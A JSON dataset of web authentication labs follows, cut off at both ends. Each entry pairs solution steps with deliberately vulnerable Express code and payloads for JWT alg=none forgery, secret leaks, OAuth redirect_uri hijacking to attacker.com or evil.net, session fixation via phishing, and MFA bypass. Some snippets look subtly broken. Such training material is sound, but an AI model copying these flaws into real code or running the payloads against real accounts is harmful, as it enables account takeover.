  "Lab Description": "The application uses JWTs to authorize API requests but misconfigures signature verification. The header parser leaks the JWT secret in debug mode when an invalid token is submitted. The application trusts any token signed with this secret. To solve: exploit the debug leak, forge a token for user 'admin', and access /admin-panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to send an invalid JWT token to /api/user-info and inspect the verbose debug output.",
    "Confirm JWT secret leakage in the response body or verbose logs.",
    "Craft a forged JWT with 'alg: HS256' and 'sub: admin', sign it using the leaked secret using jwt.io.",
    "Send the forged JWT in the Authorization header to /admin-panel.",
    "Observe 200 OK and sensitive admin data in the response to verify the exploit."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const SECRET = 'insecuredevsecret'; const DEBUG = true; app.get('/api/user-info', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); res.json({ user: decoded.sub }); } catch (err) { if (DEBUG) return res.status(400).json({ error: err.message, debug: 'SECRET: ' + SECRET }); res.status(401).send('Unauthorized'); } }); app.get('/admin-panel', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; const decoded = jwt.verify(token, SECRET); if (decoded.sub === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(3000);",
  "payloads": [
    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.XN4iAZF0aDlLuIP6_1dp1zN8vGh44iEtVPGwrfEVmSk"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allowing token reuse",
  "Lab Description": "The application integrates third-party OAuth for login. It reuses old authorization codes and does not bind tokens to sessions. This allows replaying a leaked code to impersonate another user. To solve: extract an intercepted OAuth code from logs, reuse it to generate a valid token for 'victim@example.com', and access their profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture a complete OAuth login flow for your own account and analyze the exchange.",
    "Find an old intercepted code for victim@example.com in the application debug endpoint /oauth/logs.",
    "Replay the intercepted code against /oauth/token endpoint to obtain an active access token.",
    "Use this token in the Authorization header to call /api/profile.",
    "Confirm the profile response shows victim@example.com details."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); let issuedCodes = { 'abc123': 'victim@example.com' }; let accessTokens = {}; app.post('/oauth/token', (req, res) => { const { code } = req.body; if (issuedCodes[code]) { const token = Buffer.from(issuedCodes[code]).toString('base64'); accessTokens[token] = issuedCodes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/api/profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (accessTokens[token]) return res.json({ email: accessTokens[token] }); res.status(403).send('Invalid token'); }); app.get('/oauth/logs', (req, res) => { res.json({ logs: [{ code: 'abc123', email: 'victim@example.com' }] }); }); app.listen(4000);",
  "payloads": [
    "POST /oauth/token { \"code\": \"abc123\" }",
    "GET /api/profile with Authorization: Bearer dmljdGltQGV4YW1wbGUuY29t"
  ]
},
{
  "Lab scenario": "Session fixation via insecure Set-Cookie path scoping",
  "Lab Description": "The application sets a session cookie with path=/login only, allowing an attacker to pre-set a session cookie that persists during victim login. This enables session fixation attacks. To solve: set a session cookie with fixed ID, trick victim into login, then hijack session to access /my-account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept response from /login and confirm the Set-Cookie path=/login attribute.",
    "Send a crafted request with a fixed session ID to /login and forward it to the victim.",
    "After the victim logs in, reuse the fixed session ID to access /my-account.",
    "Observe the victim’s data returned to confirm the session takeover.",
    "Ensure the session ID is stable and no additional session regeneration occurs."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'victim': 'letmein' }; app.post('/login', (req, res) => { const sessionId = req.cookies['sessid'] || Math.random().toString(36).slice(2); res.setHeader('Set-Cookie', `sessid=${sessionId}; Path=/login`); const { username, password } = req.query; if (users[username] === password) { sessions[sessionId] = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies['sessid']]; if (user) return res.send('Account data for ' + user); res.send('Unauthorized'); }); app.listen(5000);",
  "payloads": [
    "Set Cookie: sessid=fixedsession123",
    "GET /login?username=victim&password=letmein",
    "GET /my-account with Cookie: sessid=fixedsession123"
  ]
},
{
  "Lab scenario": "MFA bypass via logic bug in verification fallback",
  "Lab Description": "The MFA mechanism includes a logic flaw where failure to submit a token defaults to a verified state if the user is marked 'trusted'. The application misclassifies users as trusted after a single login attempt. To solve: log in, ensure 'trusted' flag is set, then omit the MFA step and access sensitive resources.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Log in with correct credentials to trigger 'trusted' state setting.",
    "Use Burp to intercept POST /mfa-verify and send request without the token parameter.",
    "Observe response indicating access granted despite no MFA validation.",
    "Access /settings page using session cookie to confirm bypass.",
    "Repeat the flow to ensure consistent bypass across sessions."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(express.urlencoded({ extended: true })); app.use(session({ secret: 'devsecret', resave: false, saveUninitialized: true })); const users = { 'alice': { password: 'securepass', trusted: false } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { req.session.user = username; users[username].trusted = true; res.redirect('/mfa-verify'); } else { res.send('Login failed'); } }); app.post('/mfa-verify', (req, res) => { const user = req.session.user; if (users[user].trusted) return res.redirect('/settings'); if (req.body.token === '654321') return res.redirect('/settings'); res.send('MFA failed'); }); app.get('/settings', (req, res) => { if (req.session.user) return res.send('Settings for ' + req.session.user); res.send('Unauthorized'); }); app.listen(6000);",
  "payloads": [
    "POST /login username=alice&password=securepass",
    "POST /mfa-verify with no token parameter",
    "GET /settings with valid session cookie"
  ]
},
{
  "Lab scenario": "Session Fixation in OAuth Authorization Flow",
  "Lab Description": "The lab simulates a third-party login using OAuth. The application does not properly regenerate session identifiers after OAuth authentication. An attacker can fixate a session ID prior to login. To solve: hijack a victim’s session post-OAuth login using a pre-set session token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Using Burp Suite, navigate to the /auth/initiate endpoint and observe the OAuth redirect to /auth/callback.",
    "2.Intercept the request to /auth/initiate and extract the session cookie. Share the session token with the victim.",
    "3.Wait for the victim to complete the OAuth login using the shared session (or simulate it).",
    "4.After the victim completes login, reuse the fixed session cookie from step 2.",
    "5.Send a GET /my-account request with the fixed session cookie and verify access to the victim’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const request = require('request'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/auth/initiate', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.redirect('https://oauth-provider.com/auth?redirect_uri=http://localhost:4000/auth/callback'); }); app.get('/auth/callback', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]) { sessions[sid].authenticated = true; sessions[sid].user = 'victim'; res.redirect('/my-account'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.authenticated) { res.send('Account page of ' + sessions[sid].user); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
  "payloads": [
    "Fix session ID before victim logs in: Cookie: sid=abc123",
    "Re-use same Cookie: sid=abc123 after victim logs in via OAuth"
  ]
},
{
  "Lab scenario": "JWT none algorithm authentication bypass",
  "Lab Description": "This application uses JWT tokens for session handling. However, it accepts tokens signed with the 'none' algorithm without verifying the signature. To solve: forge a JWT with alg=none to impersonate the admin user and access the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Log in as a regular user and intercept the JWT using Burp Suite.",
    "2.Decode the JWT using jwt.io or Postman and observe it uses RS256 algorithm.",
    "3.Craft a new JWT header with \"alg\": \"none\" and payload with \"user\": \"admin\".",
    "4.Remove the signature part and use this token in the Authorization header.",
    "5.Send a GET /admin request with the forged token and verify access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (!token) return res.status(403).send('No token'); const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome Admin'); } try { const verified = jwt.verify(token, 'supersecret'); if (verified.user === 'admin') return res.send('Welcome Admin'); } catch { res.status(403).send('Invalid token'); } }); app.listen(4001);",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"user\":\"admin\"}",
    "JWT: base64url(header).base64url(payload)."
  ]
},
{
  "Lab scenario": "Session fixation via login endpoint on SOAP API",
  "Lab Description": "The backend SOAP service fails to invalidate old session IDs during login. This allows an attacker to fixate a known session and later hijack a victim's authenticated session. To solve: capture a session before login, fixate it, and use it to access the victim’s session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Capture a SOAP login request using Burp Suite. Note the sessionID in the Set-Cookie response.",
    "2.Share or implant the fixed session cookie into the victim’s browser.",
    "3.Wait for the victim to log in normally using the fixed session.",
    "4.Reuse the same session cookie and send a SOAP request to /soap/getProfile.",
    "5.Verify that the session is now authenticated and data returned belongs to the victim."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text()); app.use(cookieParser()); const sessions = {}; app.post('/soap/login', (req, res) => { const sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { user: 'victim' }; res.cookie('sid', sid); res.send(`<soap:Envelope><soap:Body><loginResponse>OK</loginResponse></soap:Body></soap:Envelope>`); }); app.post('/soap/getProfile', (req, res) => { const sid = req.cookies.sid; if (sessions[sid]?.user) { res.send(`<soap:Envelope><soap:Body><profile>User: ${sessions[sid].user}</profile></soap:Body></soap:Envelope>`); } else { res.status(403).send('Invalid session'); } }); app.listen(4002);",
  "payloads": [
    "Fix sessionID before victim login: Cookie: sid=xyz999",
    "Reuse same Cookie: sid=xyz999 to call /soap/getProfile after victim logs in"
  ]
},
{
  "Lab scenario": "Session fixation via upgrade flow in REST login",
  "Lab Description": "The application uses session-based authentication and supports an 'upgrade' mechanism where unauthenticated sessions can be promoted after login. The session ID is not regenerated upon successful login, allowing fixation. To solve: Fixate a session ID and login as Carlos without knowing his credentials.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite Proxy to capture the GET /session request and extract the Set-Cookie header (unauthenticated session ID).",
    "Use OWASP ZAP to confirm that the same session persists across pre-auth and post-auth requests.",
    "Craft a phishing endpoint that forces Carlos to authenticate while using the fixated session ID in their browser (sent via link or injected in iframe).",
    "Once Carlos logs in with the fixated session ID, reuse the same ID to access the authenticated session.",
    "Visit /my-account with the stolen session ID to confirm access to Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); app.use(session({ secret: 'fixation-secret', resave: false, saveUninitialized: true })); const users = { 'carlos': 'hunter2' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username) res.send('Sensitive account data for ' + req.session.username); else res.status(403).send('Not authenticated'); }); app.listen(3000);",
  "payloads": [
    "Reuse session ID across victim login and attacker session",
    "GET /login with fixated JSESSIONID",
    "Send phishing link with fixated cookie: JSESSIONID=attacker123"
  ]
},
{
  "Lab scenario": "JWT none algorithm override in GraphQL login API",
  "Lab Description": "This application uses JWTs to authenticate users for a GraphQL endpoint. The JWT validation accepts tokens with the 'none' algorithm when no signature is provided. To solve: Forge a token with 'none' algorithm and gain access to Carlos’s account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to login with valid credentials and observe the Authorization Bearer token format returned from GraphQL /auth endpoint.",
    "Decode the JWT using jwt.io and note that it uses RS256 algorithm.",
    "Manually forge a new JWT token with header { \"alg\": \"none\", \"typ\": \"JWT\" } and payload { \"username\": \"carlos\" }.",
    "Use the unsigned token in the Authorization header to call a protected GraphQL query (e.g., getAccountData).",
    "Observe successful access to Carlos's account info in the response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { carlos: 'securepassword' }; const pubKey = 'PUBLIC_KEY_PLACEHOLDER'; app.post('/auth', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ username }, pubKey, { algorithm: 'RS256' }); res.json({ token }); } else { res.status(401).json({ error: 'Unauthorized' }); } }); app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const user = jwt.verify(token, pubKey, { algorithms: ['RS256', 'none'] }); if (user.username) return res.json({ data: 'Welcome back ' + user.username }); } catch { return res.status(403).json({ error: 'Access denied' }); } }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Authorization: Bearer <unsigned-token>",
    "{ \"query\": \"{ getAccountData }\" }"
  ]
},
{
  "Lab scenario": "OAuth implicit flow open redirect with token leak",
  "Lab Description": "This app uses OAuth with the implicit grant type. The redirect_uri parameter is improperly validated, allowing token leakage via open redirect. To solve: Exploit the open redirect to capture an access token and impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to initiate an OAuth login and intercept the /authorize request URL with response_type=token.",
    "Modify the redirect_uri parameter to redirect to your attacker-controlled server (e.g., https://evil.net/callback).",
    "Confirm the application accepts unvalidated domains via redirect_uri parameter.",
    "When Carlos logs in via your malicious link, his token will be sent to your server in the URI fragment.",
    "Extract the token from the request and use it in a Bearer header to access Carlos’s account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const users = { carlos: 'carlos-access-token-123' }; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri, username } = req.query; if (response_type === 'token' && users[username]) { const accessToken = users[username]; res.redirect(redirect_uri + '#access_token=' + accessToken); } else { res.status(400).send('Bad request'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(users).includes(token)) res.send('Private profile data for Carlos'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
  "payloads": [
    "https://victim.com/authorize?response_type=token&client_id=123&redirect_uri=https://evil.net/callback&username=carlos",
    "Access token from URI fragment: access_token=carlos-access-token-123",
    "Authorization: Bearer carlos-access-token-123"
  ]
},
{
  "Lab scenario": "Session replay due to insecure session expiration logic in REST API",
  "Lab Description": "The application does not enforce session expiration correctly, allowing reuse of stale tokens within a brief timing window. It uses stateless session tokens with no revocation tracking. To solve: replay a previously valid session token to access Carlos's account after logout.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a successful login request and capture the session token in the Set-Cookie header.",
    "In Postman, validate the session token by using it in a GET /user/me request.",
    "Logout to invalidate the session, but quickly replay the token using a GET /account request.",
    "Use OWASP ZAP to fuzz the timing window by delaying requests incrementally and observing 200 OK responses.",
    "If the token is still accepted briefly after logout, access /account as carlos and confirm session hijack success."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'test123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid login'); const token = Date.now() + '_' + Math.random().toString(36).substring(2); sessions[token] = { username, issued: Date.now() }; res.cookie('token', token); res.send('Logged in'); }); app.post('/logout', (req, res) => { const { token } = req.cookies; delete sessions[token]; res.send('Logged out'); }); app.get('/account', (req, res) => { const session = sessions[req.cookies.token]; if (session && (Date.now() - session.issued < 10000)) { return res.send('Account page for carlos'); } res.status(403).send('Access denied'); }); const PORT = 3001; app.listen(PORT, () => console.log(`Session Replay Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Replay cookie token from Burp before it expires",
    "Delay logout by 5 seconds and send /account with same cookie",
    "GET /account with previous session token from proxy history"
  ]
},
{
  "Lab scenario": "JWT authentication bypass using 'none' algorithm in GraphQL API",
  "Lab Description": "The backend incorrectly accepts JWTs signed with the 'none' algorithm. The application uses JWTs to authorize GraphQL queries. To solve: forge a JWT to access Carlos's account profile by injecting a token with 'alg':'none'.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to log in and capture the Authorization: Bearer header from a GraphQL request.",
    "Decode the JWT using jwt.io and observe that the token is using HS256 and includes 'sub':'wiener'.",
    "Craft a new JWT manually with 'alg':'none' and 'sub':'carlos', omitting the signature.",
    "Use Postman to send a GraphQL query with forged JWT to query { me { username email } }.",
    "If the response includes carlos's email, access /account to complete the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = { wiener: 'wienerpass', carlos: 'carlospass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ sub: username }, 'supersecret', { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid'); }); app.post('/graphql', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, 'supersecret', { algorithms: ['HS256', 'none'] }); if (payload.sub === 'carlos') return res.send({ data: { username: 'carlos', email: 'carlos@corp.local' } }); } catch (e) { return res.status(403).send('Invalid token'); } res.send({ data: { username: 'unknown' } }); }); const PORT = 3002; app.listen(PORT, () => console.log(`JWT None Algorithm Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "JWT with header {\"alg\":\"none\"}, payload {\"sub\":\"carlos\"}, and no signature",
    "Authorization: Bearer <base64header>.<base64payload>.",
    "GraphQL query: { me { username email } } with forged JWT"
  ]
},
{
  "Lab scenario": "OAuth 2.0 code interception due to open redirect in callback endpoint",
  "Lab Description": "The application integrates with a third-party OAuth provider, but its redirect_uri parameter is vulnerable to open redirection. An attacker can intercept the authorization code and complete OAuth flow as another user. To solve: log in to Carlos's account via stolen OAuth token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the OAuth authorization flow and observe the redirect_uri parameter during redirection.",
    "Modify the redirect_uri to point to attacker.com/callback and send the victim to the modified link.",
    "On attacker.com, capture the code parameter sent by the OAuth provider.",
    "Use Postman to exchange the intercepted code for an access token using /oauth/token endpoint.",
    "Send the token to /me or /account to impersonate Carlos and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const tokenRes = await axios.post('https://oauth-provider/token', { code, redirect_uri }); const accessToken = tokenRes.data.access_token; res.send('Authenticated with token: ' + accessToken); }); app.get('/account', async (req, res) => { const { token } = req.query; const userRes = await axios.get('https://oauth-provider/userinfo', { headers: { Authorization: 'Bearer ' + token } }); if (userRes.data.email === 'carlos@corp.local') { return res.send('Account details for carlos'); } res.status(403).send('Access denied'); }); const PORT = 3003; app.listen(PORT, () => console.log(`OAuth Code Interception Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "https://auth.example.com/oauth/authorize?redirect_uri=https://attacker.com/callback",
    "POST /oauth/token with stolen code and correct client_id/client_secret",
    "GET /account?token=<stolen-access-token>"
  ]
},
{
  "Lab scenario": "Session fixation via preserved session ID in OAuth callback",
  "Lab Description": "The application integrates OAuth for external login but incorrectly preserves session identifiers across the authorization process. The application allows the session ID set before the OAuth login to persist and bind to the authenticated session. To solve: Hijack Carlos's authenticated session by fixing a session ID and triggering OAuth login.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to initiate a login via OAuth and intercept the GET /oauth/start request to observe the session cookie.",
    "2. Manually set a session cookie in your browser before login (e.g., sessionid=attacker123) and complete the OAuth login flow.",
    "3. Verify that the sessionid remains the same after completing login, confirming session fixation.",
    "4. Craft a phishing link using the fixed session ID and send it to the victim.",
    "5. When Carlos completes the OAuth login using your fixed session ID, use the same session ID to access his account page."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 's3cr3t', resave: false, saveUninitialized: true })); const users = { 'carlos': { loggedIn: false } }; app.get('/oauth/start', (req, res) => { const redirectUri = 'http://localhost:4000/oauth/callback?sid=' + req.session.id; res.redirect(redirectUri); }); app.get('/oauth/callback', (req, res) => { const sid = req.query.sid; if (sid && users['carlos']) { req.session.id = sid; users['carlos'].loggedIn = true; res.send('OAuth login completed'); } else { res.status(403).send('Invalid callback'); } }); app.get('/account', (req, res) => { if (users['carlos'].loggedIn && req.session.id) { res.send('Carlos Account Access'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
  "payloads": [
    "http://lab.com/oauth/start (with sessionid=attacker123)",
    "http://lab.com/oauth/callback?sid=attacker123",
    "Session fixation attack link to victim"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in access token verification",
  "Lab Description": "The application uses JSON Web Tokens (JWTs) to authorize access to admin functionality but improperly trusts the algorithm field in incoming tokens. The verification step trusts tokens with alg=none or switched signing algorithms. To solve: Forge a valid JWT granting admin access using algorithm confusion.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to capture a request with a valid JWT in the Authorization header.",
    "2. Decode the JWT in jwt.io and observe the alg field and payload content.",
    "3. Modify the token to use 'alg':'none' and set 'role':'admin' in the payload.",
    "4. Re-encode the token without a signature and resend it using Burp Repeater.",
    "5. If the server accepts the unsigned token and grants admin access, verify by accessing the /admin/dashboard endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') { res.send('Admin access granted'); } else { res.status(403).send('User not admin'); } } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "{ \"alg\": \"none\", \"typ\": \"JWT\" }.{ \"username\": \"carlos\", \"role\": \"admin\" }.",
    "Authorization: Bearer <forged_unsigned_token>",
    "Modified JWT with role=admin and alg=none"
  ]
},
{
  "Lab scenario": "Bypassing MFA with misconfigured OTP verification logic",
  "Lab Description": "The application uses an OTP-based second factor of authentication but verifies only the presence—not validity—of the OTP. A user can bypass this step by submitting a malformed or missing value. To solve: Access Carlos's account page without knowing the valid OTP.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the POST /verify-otp request after login.",
    "2. Observe that the OTP field is submitted as a JSON parameter (e.g., {\"otp\":\"123456\"}).",
    "3. Modify the value to null or remove it entirely in Burp Repeater.",
    "4. Resend the request and observe if authentication is granted regardless of OTP value.",
    "5. Once bypassed, access the /my-account page for Carlos to confirm the exploit."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid login'); sessions[username] = { otpRequired: true }; res.send('OTP sent'); }); app.post('/verify-otp', (req, res) => { const { username, otp } = req.body; if (sessions[username] && sessions[username].otpRequired) { sessions[username].otpRequired = false; res.send('OTP verification passed'); } else { res.status(400).send('Invalid session'); } }); app.get('/my-account', (req, res) => { res.send('Carlos account dashboard'); }); app.listen(4000);",
  "payloads": [
    "{ \"username\": \"carlos\", \"password\": \"letmein\" }",
    "{ \"username\": \"carlos\", \"otp\": null }",
    "{ \"username\": \"carlos\" }"
  ]
},
{
  "Lab scenario": "Session Fixation via token reuse vulnerability in login endpoint",
  "Lab Description": "The application's login logic accepts externally supplied session tokens, leading to a session fixation vulnerability. The application uses a cookie named `session` but does not regenerate it after login. To solve: Fixate a session for Carlos before he logs in, then use it to access his account.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept the GET /login page request with Burp Suite and inject a custom session cookie (e.g., session=attacker123).",
    "Forward the login page request and send it to Carlos via social engineering or lure.",
    "Wait for Carlos to log in using the fixated session (session=attacker123).",
    "Replay any authenticated request (e.g., GET /dashboard) using the fixed session cookie after Carlos logs in.",
    "Access /my-account using the session cookie to confirm control over Carlos’s session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 's3cr3t' }]; const sessions = {}; app.get('/login', (req, res) => { const sessId = req.cookies.session || 'guest_' + Math.random(); res.cookie('session', sessId); res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /><input type=\"submit\" /></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send('Account page of ' + user); } else { res.status(403).send('Not authenticated'); } }); app.listen(3000);",
  "payloads": [
    "Cookie: session=attacker123",
    "POST /login with session=attacker123 in request cookies",
    "GET /my-account with Cookie: session=attacker123"
  ]
},
{
  "Lab scenario": "JWT none algorithm vulnerability in authentication token validation logic",
  "Lab Description": "The REST API uses JWTs for user authentication, but fails to enforce proper signature verification. It improperly accepts tokens with the `alg` header set to `none`. To solve: Forge a valid-looking JWT token with `none` algorithm and impersonate Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to capture a legitimate Authorization: Bearer JWT from your own login.",
    "Decode the JWT using jwt.io or jwt_tool to observe its structure.",
    "Craft a new token with header {\"alg\":\"none\"} and payload {\"username\":\"carlos\"}. Remove the signature part.",
    "Send a GET request to /api/profile using the forged JWT in the Authorization header.",
    "Confirm access to Carlos’s profile and capture the success message."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/api/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).json({ error: 'Unauthorized' }); const token = jwt.sign({ username }, 'secretkey'); res.json({ token }); }); app.get('/api/profile', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { res.send('Welcome to carlos profile'); return; } try { jwt.verify(token, 'secretkey'); res.send('Welcome to profile'); } catch { res.status(403).send('Invalid token'); } }); app.listen(3001);",
  "payloads": [
    "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
    "Base64 Header: {\"alg\":\"none\"}",
    "Base64 Payload: {\"username\":\"carlos\"}"
  ]
},
{
  "Lab scenario": "OAuth redirect URI manipulation in third-party authentication handler",
  "Lab Description": "The app implements OAuth 2.0 login via a third-party provider but does not validate the `redirect_uri` parameter. This allows an attacker to manipulate the flow and capture authorization codes. To solve: Hijack Carlos’s OAuth login flow to gain access to his session.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Send a malicious OAuth login link with the `redirect_uri` parameter pointing to your server (e.g., https://attacker.com/callback).",
    "Lure Carlos into clicking it (via email or direct message).",
    "Capture the `code` parameter sent to your server when Carlos authorizes.",
    "Exchange the authorization code at the token endpoint using Postman or Burp Repeater.",
    "Use the obtained access token to call /oauth/profile and retrieve Carlos’s session info."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); const qs = require('qs'); app.get('/oauth/callback', async (req, res) => { const { code, redirect_uri } = req.query; const data = qs.stringify({ code, redirect_uri, client_id: 'app123', client_secret: 'secret' }); try { const tokenRes = await axios.post('https://oauthprovider.com/token', data); const accessToken = tokenRes.data.access_token; // no validation of redirect_uri res.send('Logged in as Carlos using token: ' + accessToken); } catch { res.status(500).send('OAuth error'); } }); app.listen(3002);",
  "payloads": [
    "https://vulnerable-app.com/oauth/callback?redirect_uri=https://attacker.com/callback",
    "https://attacker.com/callback?code=AUTHCODE123",
    "POST /token with code=AUTHCODE123, redirect_uri=https://attacker.com/callback"
  ]
},
{
  "Lab scenario": "JWT Algorithm Confusion in Authorization Header",

